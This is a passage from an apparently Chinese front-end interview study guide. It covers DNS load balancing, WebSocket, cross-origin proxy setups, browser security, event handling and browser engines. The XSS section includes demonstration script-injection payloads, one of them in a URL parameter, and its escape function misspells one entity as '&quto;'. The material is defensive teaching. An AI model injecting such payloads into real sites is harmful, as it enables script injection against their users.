可以用于在冗余的服务器上实现负载平衡。现在一般的大型网站使用多台服务器提供服务，因此一个域名可能会对应多个服务器地址。当用户向网站域名请求的时候，DNS 服务器返回这个域名所对应的服务器 IP 地址的集合，但在每个回答中，会循环这些 IP 地址的顺序，用户一般会选择排在前面的地址发送请求。以此将用户的请求均衡的分配到各个不同的服务器上，这样来实现负载均衡。</p><p><strong>缺点</strong>：由于 DNS 服务器中存在缓存，所以有可能一个服务器出现故障后，域名解析仍然返回的是那个 IP 地址，就会造成访问的问题。</p></li></ol><h3 id="六、WebSocket-协议"><a href="#六、WebSocket-协议" class="headerlink" title="六、WebSocket 协议"></a>六、WebSocket 协议</h3><p>WebSocket protocol是HTML5一种新的协议。它实现了浏览器与服务器全双工通信，同时允许跨域通讯，是server push技术的一种很好的实现。</p><p>使用Socket.io，它很好地封装了webSocket接口，提供了更简单、灵活的接口，也对不支持webSocket的浏览器提供了向下兼容。</p><ol><li><p>前端代码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>user input：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/socket.io/2.2.0/socket.io.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> socket = io(<span class="string">&#x27;http://www.domain2.com:8080&#x27;</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="comment">// 连接成功处理</span></span></span><br><span class="line"><span class="javascript">socket.on(<span class="string">&#x27;connect&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 监听服务端消息</span></span></span><br><span class="line"><span class="javascript">    socket.on(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">&#x27;data from server: ---&gt; &#x27;</span> + msg); </span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 监听服务端关闭</span></span></span><br><span class="line"><span class="javascript">    socket.on(<span class="string">&#x27;disconnect&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">&#x27;Server socket has closed.&#x27;</span>); </span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript">&#125;);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;input&#x27;</span>)[<span class="number">0</span>].onblur = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    socket.send(<span class="built_in">this</span>.value);</span></span><br><span class="line"><span class="javascript">&#125;;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>Nodejs socket后台：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> socket = <span class="built_in">require</span>(<span class="string">&#x27;socket.io&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启http服务</span></span><br><span class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">        <span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;text/html&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">    res.end();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(<span class="string">&#x27;8080&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Server is running at port 8080...&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听socket连接</span></span><br><span class="line">socket.listen(server).on(<span class="string">&#x27;connection&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">client</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 接收信息</span></span><br><span class="line">    client.on(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">        client.send(<span class="string">&#x27;hello：&#x27;</span> + msg);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;data from client: ---&gt; &#x27;</span> + msg);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 断开处理</span></span><br><span class="line">    client.on(<span class="string">&#x27;disconnect&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;Client socket has closed.&#x27;</span>); </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ol><h2 id="项目中遇到的跨域"><a href="#项目中遇到的跨域" class="headerlink" title="项目中遇到的跨域"></a>项目中遇到的跨域</h2><p><strong>Vue项目开发中解决跨域：</strong></p><ol><li><p>打开 config 文件夹（vue-cli 配置文件）里的 inedx.js，在 proxyTable 中设置跨域。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">proxyTable: &#123;</span><br><span class="line">    <span class="string">&#x27;/api&#x27;</span>: &#123;</span><br><span class="line">        <span class="comment">// 配置跨域</span></span><br><span class="line">        <span class="attr">target</span>: <span class="string">&#x27;http://x.x.x.x:x/&#x27;</span>,  <span class="comment">// 请求的目标服务器接口</span></span><br><span class="line">        <span class="attr">changeOrigin</span>: <span class="literal">true</span>,  <span class="comment">// 设置允许跨域</span></span><br><span class="line">        <span class="attr">pathRewrite</span>: &#123;  <span class="comment">// 这个重写不可省略！因为真正请求的地址并不含 /api</span></span><br><span class="line">            <span class="string">&#x27;^/api&#x27;</span>: <span class="string">&#x27;&#x27;</span> <span class="comment">/* 浏览器中看到的请求地址为：http://localhost:8080/api/data/getdata ，因为重写了/api ，所以实际上访问的地址是：http://x.x.x.x:x/data/getdata */</span></span><br><span class="line">        &#125;              </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在 vue 项目 src 目录下找到 main.js 文件，在创建 axios 实例的时候将 baseURL 设置为 /api</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line">Vue.prototype.$axios = axios</span><br><span class="line"><span class="comment">//配置请求的根路径</span></span><br><span class="line">axios.defaults.baseURL = <span class="string">&#x27;/api&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>原理</strong>：将域名发送给本地的服务器（启动vue项目的服务，localhost:8080），再由本地的服务器去请求真正的服务器。</p><p><strong>生产环境解决跨域：</strong></p><p>使用nginx反向代理，在配置文件nginx.conf中找到server{}对象，更改项目地址root和配置代理地址proxy_pass（适合前端静态文件使用）：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">    <span class="attribute">root</span>   D:/browseClient/dist;  <span class="comment">#自己的前端项目地址</span></span><br><span class="line">    <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#解决跨域</span></span><br><span class="line"><span class="attribute">location</span> /api &#123;                                <span class="comment"># 自定义nginx接口前缀</span></span><br><span class="line">    <span class="attribute">proxy_pass</span>   http://127.0.0.1:3000;            <span class="comment"># 后台api接口地址</span></span><br><span class="line">            <span class="attribute">proxy_redirect</span> default;      </span><br><span class="line">    <span class="comment">#设置主机头和客户端真实地址，以便服务器获取客户端真实IP</span></span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host $host;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Real-IP $remote_addr;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-For $proxy_add_x_forwarded_for;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h1><p>参考自 <a href="https://juejin.cn/book/6844733763675488269/section/6844733763776151565">前端面试之道</a>。</p><h2 id="什么是-XSS-攻击？（高频）"><a href="#什么是-XSS-攻击？（高频）" class="headerlink" title="什么是 XSS 攻击？（高频）"></a>什么是 XSS 攻击？（高频）</h2><p>XSS 攻击：跨站脚本攻击，是一种<strong>代码注入攻击</strong>。攻击者通过在网站注入恶意脚本，使之在用户的浏览器上运行，从而盗取用户的信息如 cookie 等。</p><p>XSS <strong>本质</strong>：因为网站<strong>没有对恶意代码进行过滤</strong>，与正常的代码混合在一起，导致浏览器没有办法分辨哪些脚本是可信的，从而导致恶意代码的执行。</p><p>XSS 分为<strong>持久型和非持久型</strong>:</p><ul><li><p>持久型：攻击的代码被服务端写入进<strong>数据库</strong>中，这种攻击危害性很大，因为如果网站访问量很大，就会导致大量正常访问页面的用户都受到攻击。举个例子，对于评论功能来说，就得防范持久型 XSS 攻击，因为可以在评论中输入以下内容<code>&lt;script&gt; alert(1) &lt;/script&gt;</code>。</p></li><li><p>非持久型：一般通过<strong>修改 URL 参数</strong>的方式加入攻击代码，诱导用户访问链接从而进行攻击。举个例子，如果页面需要从 URL 中获取某些参数作为内容的话，不经过过滤就会导致攻击代码被执行</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- http://www.domain.com?name=&lt;script&gt;alert(1)&lt;/script&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>     </span><br></pre></td></tr></table></figure></li></ul><h2 id="如何防范-XSS-攻击？（高频）"><a href="#如何防范-XSS-攻击？（高频）" class="headerlink" title="如何防范 XSS 攻击？（高频）"></a>如何防范 XSS 攻击？（高频）</h2><ol><li><p><strong>转义字符：</strong>对于用户的输入应该永远不信任。最普遍的做法就是转义输入输出的内容，对引号、尖括号、斜杠进行转义。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  str = str.replace(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quto;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/`/g</span>, <span class="string">&#x27;&amp;#96;&#x27;</span>)</span><br><span class="line">  str = str.replace(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2F;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> str</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>白名单过滤（CSP）</strong>：对于显示富文本来说，显然不能转义所有字符，因为这样会把需要的格式也过滤掉，因此采用白名单过滤。</p></li><li><p><strong>对一些敏感信息进行保护</strong>：比如 cookie 使用 http-only，使得脚本无法获取。</p></li><li><p><strong>验证码</strong>，避免脚本伪装成用户执行一些操作。</p></li></ol><h3 id="什么是-CSP-？"><a href="#什么是-CSP-？" class="headerlink" title="什么是 CSP ？"></a>什么是 CSP ？</h3><p>CSP：内容安全策略，本质是<strong>建立一个白名单，告诉浏览器哪些外部资源可以加载和执行</strong>。只需要配置规则，如何拦截由浏览器自己来实现。可以通过这种方式来<strong>尽量减少 XSS 攻击 (最有效的方法)</strong></p><p>开启 CSP 的方式：</p><ol><li>设置 HTTP Header 中的 <code>Content-Security-Policy</code><ul><li>只允许加载本站资源 <code>Content-Security-Policy: default-src ‘self’</code></li><li>只允许加载 HTTPS 协议图片 <code>Content-Security-Policy: img-src https://*</code></li><li>允许加载任何来源框架 <code>Content-Security-Policy: child-src &#39;none&#39;</code></li></ul></li><li>设置 <code>meta</code> 标签 <code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot;&gt;</code></li></ol><h2 id="什么是-CSRF-攻击？（高频）"><a href="#什么是-CSRF-攻击？（高频）" class="headerlink" title="什么是 CSRF 攻击？（高频）"></a>什么是 CSRF 攻击？（高频）</h2><p>CSRF：<strong>跨站请求伪造</strong>。原理是<strong>攻击者构造出一个后端请求地址，诱导用户点击或者通过某些途径自动发起请求。</strong>如果用户在登录状态下，后端就以为是用户在操作，从而进行相应的逻辑。CSRF 攻击的<strong>本质是利用 cookie 会在同源请求中携带发送给服务器的特点</strong>，以此来实现用户的冒充。</p><p>CSRF 攻击类型一般有三种：</p><ul><li><p>GET 类型，比如在网站中的一个 img 标签里构建一个请求，当用户打开这个网站的时候就会自动发起提交。</p></li><li><p>POST 类型，比如构建一个表单，然后隐藏它，当用户进入页面时，自动提交这个表单。</p></li><li><p>链接类型，比如在 a 标签的 href 属性里构建一个请求，然后诱导用户去点击。</p></li></ul><h2 id="如何防范-CSRF-攻击？（高频）"><a href="#如何防范-CSRF-攻击？（高频）" class="headerlink" title="如何防范 CSRF 攻击？（高频）"></a>如何防范 CSRF 攻击？（高频）</h2><p>防范 CSRF 攻击需要遵循以下几种规则：</p><ol><li>GET 请求不对数据进行修改</li><li>不让第三方网站访问到用户 Cookie</li><li>阻止第三方网站请求接口</li><li>请求时附带验证信息，比如验证码或者 Token</li></ol><p><strong>具体防范方法：</strong></p><ol><li><p><strong>SameSite：</strong>对 Cookie 设置 SameSite 属性，表示 Cookie 不随着跨域请求发送。可以很大程度减少 CSRF 的攻击。Samesite 一共两种模式，严格模式（strict）下 Cookie 在任何情况都不可能作为第三方 Cookie 使用；宽松模式（Lax）下，Cookie 可以被请求是 GET 请求，且会发生页面跳转的请求所使用。</p><p><strong>缺点</strong>：该属性目前并不是所有浏览器都兼容，且因为它不支持子域，所以子域没有办法与主域共享登录信息，每次转入子域的网站，都会重新登录。</p></li><li><p><strong>验证 Referer：</strong>同源检测的方法，对于需要防范 CSRF 的请求，可以通过验证 http 请求头中的 Referer 来判断该请求是否为第三方网站发起的。</p><p><strong>缺点</strong>：有些情况下 Referer 可以被伪造。同时这种方法把搜索引擎的链接也给屏蔽了，所以一般网站会允许搜索引擎的页面请求，但是相应的页面请求这种请求方式也可能被攻击者给利用。</p></li><li><p><strong>Token：</strong>服务器向用户返回一个随机数 Token，每次发起请求时将 Token 携带上，服务器验证 Token 是否有效。</p><p><strong>缺点</strong>：需要给网站中的所有请求都添加上这个 token，操作比较繁琐。此外如果请求经过负载平衡，转移到了其他的服务器，但是这个服务器的 session 中没有保留这个 token 的话，就没法验证。这种情况可以通过改变 token 的构建方式来解决。</p></li><li><p><strong>双重 Cookie 验证：</strong>服务器在用户访问网站页面时，向请求域名注入一个 Cookie，内容为随机字符串，然后当用户再次向服务器发送请求的时候，从 Cookie 中取出这个字符串，添加到 URL 参数中，然后服务器通过对 Cookie 中的数据和参数中的数据进行比较验证。这种方式利用了攻击者只能利用 Cookie，但是不能访问获取 Cookie 的特点，比 Token 的方法更加方便，且不涉及分布式访问的问题。</p><p><strong>缺点</strong>：如果网站存在 XSS 漏洞，那么这种方式会失效。同时不能做到子域名的隔离。</p></li></ol><h2 id="什么是中间人攻击？如何防范？（高频）"><a href="#什么是中间人攻击？如何防范？（高频）" class="headerlink" title="什么是中间人攻击？如何防范？（高频）"></a>什么是中间人攻击？如何防范？（高频）</h2><p>中间人攻击：<strong>攻击方同时与服务端和客户端建立连接</strong>，并让对方认为连接是安全的，但是实际上整个通信过程都被攻击者控制。攻击者不仅能获得双方的通信信息，还能修改通信信息。通常不建议使用公共的 Wi-Fi，因为很可能就会发生中间人攻击的情况。</p><p>攻击过程如下:</p><ul><li>客户端发送请求到服务端，请求被中间⼈截获</li><li>服务器向客户端发送公钥</li><li>中间⼈截获公钥，保留在⾃⼰⼿上。然后⾃⼰⽣成⼀个<strong>伪造的</strong>公钥，发给客户端</li><li>客户端收到伪造的公钥后，⽣成加密hash值发给服务器</li><li>中间⼈获得加密hash值，⽤⾃⼰的私钥解密获得真秘钥,同时⽣成假的加密hash值，发给服务器</li><li>服务器⽤私钥解密获得假密钥,然后加密数据传输给客户端</li></ul><p>防御中间人攻击：<strong>增加一个安全通道来传输信息</strong>（HTTPS）。</p><h2 id="SQL-注入攻击？"><a href="#SQL-注入攻击？" class="headerlink" title="SQL 注入攻击？"></a>SQL 注入攻击？</h2><p>SQL 注入攻击：攻击者在 HTTP 请求中注入恶意的 SQL 代码，服务器使用参数构建数据库 SQL 命令时，恶意 SQL 被一起构造，破坏原有 SQL 结构，并在数据库中执行。</p><h2 id="点击劫持？"><a href="#点击劫持？" class="headerlink" title="点击劫持？"></a>点击劫持？</h2><p>点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 <code>iframe</code> 嵌套的方式嵌入自己的网页中，并将 <code>iframe</code> 设置为透明，在页面中透出一个按钮诱导用户点击。</p><p><strong>防范：</strong></p><ol><li><p><strong>X-FRAME-OPTIONS：</strong>一个 HTTP 响应头，<code>header(&#39;X-Frame-Options:DENY&#39;)</code>。有三个值可选：</p><ul><li><p><code>DENY</code>，表示页面不允许通过 <code>iframe</code> 的方式展示</p></li><li><p><code>SAMEORIGIN</code>，表示页面可以在相同域名下通过 <code>iframe</code> 的方式展示</p></li><li><p><code>ALLOW-FROM</code>，表示页面可以在指定来源的 <code>iframe</code> 中展示</p></li></ul></li><li><p><strong>JS 防御：</strong>对于某些远古浏览器来说，并不能支持上面的这种方式，只有通过 JS 的方式来防御点击劫持。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">if</span> (top.location != <span class="built_in">window</span>.location)&#123;</span><br><span class="line">        top.location = <span class="built_in">window</span>.location </span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><h1 id="事件机制（高频）"><a href="#事件机制（高频）" class="headerlink" title="事件机制（高频）"></a>事件机制（高频）</h1><p>事件是用户操作网页时发生的交互动作，还可以是文档加载，窗口滚动和大小调整。事件被封装成一个 event 对象，包含了该事件发生时的所有相关信息（ event 的属性）以及可以对事件进行的操作（ event 的方法）。</p><h2 id="事件触发三阶段"><a href="#事件触发三阶段" class="headerlink" title="事件触发三阶段"></a>事件触发三阶段</h2><ul><li>window 往事件触发处传播，遇到注册的<strong>捕获</strong>事件会触发</li><li>传播到事件触发处时触发<strong>注册</strong>事件</li><li>从事件触发处往 window 传播，遇到注册的<strong>冒泡</strong>事件会触发</li></ul><p>事件触发一般来说会按照上面的顺序进行，但是也有特例：<strong>如果给一个 body 中的子节点同时注册冒泡和捕获事件，事件触发会按照注册的顺序执行。</strong></p><h2 id="注册事件"><a href="#注册事件" class="headerlink" title="注册事件"></a>注册事件</h2><p><code>addEventListener</code> ：第三个参数可以是布尔值或对象。布尔值参数<code>useCapture</code>（是否捕获）默认值为 false，表示冒泡。对象参数的属性：</p><ul><li><code>capture</code>：布尔值，和 <code>useCapture</code> 作用一样</li><li><code>once</code>：布尔值，值为 <code>true</code> 表示该回调只会调用一次，调用后会移除监听</li><li><code>passive</code>：布尔值，表示永远不会调用 <code>preventDefault</code></li></ul><p>如果希望事件只触发在目标上，可以使用 <code>stopPropagation</code> 来阻止事件的进一步传播。通常认为 <code>stopPropagation</code> 是用来阻止事件冒泡的，其实也可以阻止捕获事件。<code>stopImmediatePropagation</code> 同样也能实现阻止事件，还能阻止该事件目标执行别的注册事件。</p><h2 id="三种事件模型？"><a href="#三种事件模型？" class="headerlink" title="三种事件模型？"></a>三种事件模型？</h2><ul><li><p><strong>DOM0级模型</strong>，也称为原始事件模型。这种模型<strong>不会传播</strong>，所以没有事件流的概念。</p></li><li><p><strong>IE 事件模型</strong>。在该事件模型中一次事件共有两个过程：<strong>事件处理阶段</strong>和<strong>事件冒泡阶段</strong>。事件处理阶段会首先执行目标元素绑定的监听事件。事件冒泡阶段会依次检查经过的节点是否绑定了事件监听函数，如果有则执行。这种模型通过 <code>attachEvent</code> 来添加监听函数，可以添加多个监听函数，按顺序依次执行。</p></li><li><p><strong>DOM2级事件模型</strong>，是<code>W3C</code>制定的标准模型。三个过程：捕获、目标、冒泡。<strong>事件捕获阶段</strong>：捕获指事件从 document 一直向下传播到目标元素，依次检查经过的节点是否绑定了事件监听函数，如果有则执行。这种模型绑定的函数是 <code>addEventListener</code>，第三个参数指定事件是否在捕获阶段执行。</p></li></ul><h3 id="IE-与火狐事件机制的区别"><a href="#IE-与火狐事件机制的区别" class="headerlink" title="IE 与火狐事件机制的区别"></a>IE 与火狐事件机制的区别</h3><p>IE 支持事件冒泡、Firefox 支持事件冒泡和事件捕获。</p><h2 id="事件代理"><a href="#事件代理" class="headerlink" title="事件代理"></a>事件代理</h2><p>如果一个节点中的子节点是动态生成的，那么子节点注册事件<strong>应该注册在父节点上</strong>（如 ul 里面的 li）。事件代理相较于直接给目标注册事件有以下优点：</p><ul><li>节省内存</li><li>不需要给子节点注销事件</li></ul><h1 id="其他"><a href="#其他" class="headerlink" title="*其他"></a>*其他</h1><h2 id="常见的浏览器内核有哪些"><a href="#常见的浏览器内核有哪些" class="headerlink" title="*常见的浏览器内核有哪些?"></a>*常见的浏览器内核有哪些?</h2><table><thead><tr><th>浏览器/RunTime</th><th>内核（渲染引擎）</th><th>JavaScript 引擎</th></tr></thead><tbody><tr><td>Chrome</td><td>webkit-&gt;blink</td><td>V8</td></tr><tr><td>FireFox</td><td>Gecko</td><td>SpiderMonkey</td></tr><tr><td>Safari</td><td>Webkit</td><td>JavaScriptCore</td></tr><tr><td>Edge</td><td>EdgeHTML</td><td>Chakra(for JavaScript)</td></tr><tr><td>IE</td><td>Trident</td><td>JScript（IE3.0-IE8.0）</td></tr><tr><td>Opera</td><td>Presto-&gt;blink</td><td>Linear A（4.0-6.1）/ Linear B（7.0-9.2）/ Futhark（9.5-10.2）/ Carakan（10.5-）</td></tr><tr><td>Node.js</td><td>-</td><td>V8</td></tr></tbody></table><p>浏览器的内核引擎，基本上是四分天下：</p><ul><li>Trident: IE 以Trident 作为内核引擎；</li><li>Gecko: Firefox 是基于 Gecko 开发；</li><li>WebKit: Safari, Google Chrome,傲游3,猎豹浏览器,百度浏览器 opera浏览器；</li><li>Presto: Opera的内核，但由于市场选择问题，主要应用在手机平台–Opera mini。</li></ul><h2 id="浏览器的主要组成部分是什么？"><a href="#浏览器的主要组成部分是什么？" class="headerlink" title="*浏览器的主要组成部分是什么？"></a>*浏览器的主要组成部分是什么？</h2><ol><li><strong>「用户界面」</strong> - 包括地址栏、前进/后退按钮、书签菜单等。</li><li><strong>「浏览器引擎」</strong> - 在用户界面和呈现引擎之间传送指令。</li><li><strong>「呈现引擎」</strong> - 负责显示请求的内容。如果请求的内容是 HTML，它就负责解析 HTML 和 CSS 内容，并将解析后的内容显示在屏幕上。</li><li><strong>「网络」</strong> - 用于网络调用，比如 HTTP 请求。</li><li><strong>「用户界面后端」</strong> -用于绘制基本的窗口小部件，比如组合框和窗口。</li><li><strong>「JavaScript 解释器」</strong>- 用于解析和执行 JavaScript 代码。</li><li><strong>「数据存储」</strong> - 这是持久层。浏览器需要在硬盘上保存各种数据，例如 Cookie。新的 HTML 规范 (HTML5) 定义了“网络数据库”，这是一个完整（但是轻便）的浏览器内数据库。</li></ol><p>注意，和大多数浏览器不同，Chrome 浏览器的每个标签页都分别对应一个呈现引擎实例。每个标签页都是一个独立的进程。</p><h2 id="移动端的点击事件延迟是多久，为什么会有？-怎么解决？"><a href="#移动端的点击事件延迟是多久，为什么会有？-怎么解决？" class="headerlink" title="*移动端的点击事件延迟是多久，为什么会有？ 怎么解决？"></a>*移动端的点击事件延迟是多久，为什么会有？ 怎么解决？</h2><p>移动端点击有 300ms 的延迟是因为<strong>移动端会有双击缩放</strong>的这个操作，因此浏览器在 click 之后要等待 300ms，看用户有没有下一次点击，来判断这次操作是不是双击。</p><p>有三种办法来解决这个问题：</p><ul><li><p>通过 meta 标签禁用网页的缩放。<code>&lt;meta name=&quot;viewport&quot; content=&quot;user-scalable=no&quot;&gt;</code></p></li><li><p>通过 meta 标签更改默认的视口宽度。<code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;&gt; </code>浏览器在包含 width=device-width 也就是视口宽度=设备宽度或者设置为比 viewport 值更小的页面上<strong>禁用双击缩放行为</strong>。</p></li><li><p><strong>touch-action</strong>：CSS 的 touch-action 属性用于设置触摸屏用户如何操纵元素的区域，它允许移除特定元素或整个文档的触发延迟，而无需禁用缩放。</p></li><li><p>调用一些 js 库，比如 FastClick</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    FastClick.attach(<span class="built_in">document</span>.body);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure></li></ul><p>click 延时问题还可能引起点击穿透的问题，就是如果我们在一个元素上注册了 touchStart 的监听事件，这个事件会将这个元素隐藏掉，我们发现当这个元素隐藏后，触发了这个元素下的一个元素的点击事件，这就是点击穿透。</p><h2 id="检测浏览器版本有哪些方式？"><a href="#检测浏览器版本有哪些方式？" class="headerlink" title="*检测浏览器版本有哪些方式？"></a>*检测浏览器版本有哪些方式？</h2><ul><li><p>检测 window.navigator.userAgent 的值，但这种方式很不可靠，因为 userAgent 可以被改写，并且早期的浏览器如 ie，会通过伪装自己的 userAgent 的值为 Mozilla 来躲过服务器的检测。</p></li><li><p>功能检测，根据每个浏览器独有的特性来进行判断，如 ie 下独有的 ActiveXObject。</p></li></ul><h2 id="如何判断当前脚本运行环境？"><a href="#如何判断当前脚本运行环境？" class="headerlink" title="*如何判断当前脚本运行环境？"></a>*如何判断当前脚本运行环境？</h2><p><code>typeof window === &#39;undefined&#39; ? &#39;node&#39; : &#39;browser&#39;;</code></p><p>如果是 undefined，则当前脚本运行在 node 环境，否则运行在 window 环境。</p><h2 id="什么是-Polyfill-？"><a href="#什么是-Polyfill-？" class="headerlink" title="*什么是 Polyfill ？"></a>*什么是 Polyfill ？</h2><p>Polyfill 指的是用于实现浏览器并不支持的原生 API 的代码。</p><p>比如说 querySelectorAll 是很多现代浏览器都支持的原生 Web API，但是有些古老的浏览器并不支持，那么假设有人写了一段代码来实现这个功能使这些浏览器也支持了这个功能，那么这就可以成为一个 Polyfill。</p><h1 id="场景题"><a href="#场景题" class="headerlink" title="场景题"></a>场景题</h1><h2 id="如何检测浏览器所支持的最小字体大小？"><a href="#如何检测浏览器所支持的最小字体大小？" class="headerlink" title="如何检测浏览器所支持的最小字体大小？"></a>如何检测浏览器所支持的最小字体大小？</h2><p>用 JS 设置 DOM 的字体为某一个值，然后再取出来，如果值设置成功，就说明支持。</p><h2 id="插入几万个-DOM，如何实现页面不卡顿？"><a href="#插入几万个-DOM，如何实现页面不卡顿？" class="headerlink" title="插入几万个 DOM，如何实现页面不卡顿？"></a>插入几万个 DOM，如何实现页面不卡顿？</h2><p>分批次部分渲染 DOM：</p><p>1、通过 <code>requestAnimationFrame</code> 的方式去循环的插入 DOM。</p><p>2、<strong>虚拟滚动</strong>（virtualized scroller）。原理是只渲染可视区域内的内容，非可见区域的那就完全不渲染了，当用户在滚动的时候就实时去替换渲染的内容。</p><h2 id="实现一个-页面操作不会整页刷新-的网站，并且能在浏览器前进、后退时正确响应。"><a href="#实现一个-页面操作不会整页刷新-的网站，并且能在浏览器前进、后退时正确响应。" class="headerlink" title="实现一个 页面操作不会整页刷新 的网站，并且能在浏览器前进、后退时正确响应。"></a>实现一个 页面操作不会整页刷新 的网站，并且能在浏览器前进、后退时正确响应。</h2><p>通过使用 pushState + ajax 实现浏览器无刷新前进后退，当一次 ajax 调用成功后我们将一条 state 记录加入到 history对象中。一条 state 记录包含了 url、title 和 content 属性，在 popstate 事件中可以获取到这个 state 对象，使用 content 来传递数据。最后通过对 window.onpopstate 事件监听来响应浏览器的前进后退操作。</p><p>使用 pushState 来实现有两个问题：</p><ul><li>一个是打开首页时没有记录，可以使用 replaceState 来将首页的记录替换。</li><li>另一个问题是当一个页面刷新的时候，仍然会向服务器端请求数据，因此如果请求的 url 需要后端的配合将其重定向到一个页面。</li></ul><h2 id="两个HTML页面之前如何传递参数？"><a href="#两个HTML页面之前如何传递参数？" class="headerlink" title="两个HTML页面之前如何传递参数？"></a>两个HTML页面之前如何传递参数？</h2><p>（比如一个表单分两页，在第二页提交表单时如何获取到第一页的数据）</p><p><a href="https://blog.csdn.net/csdn_ds/article/details/78393564">https://blog.csdn.net/csdn_ds/article/details/78393564</a></p><h2 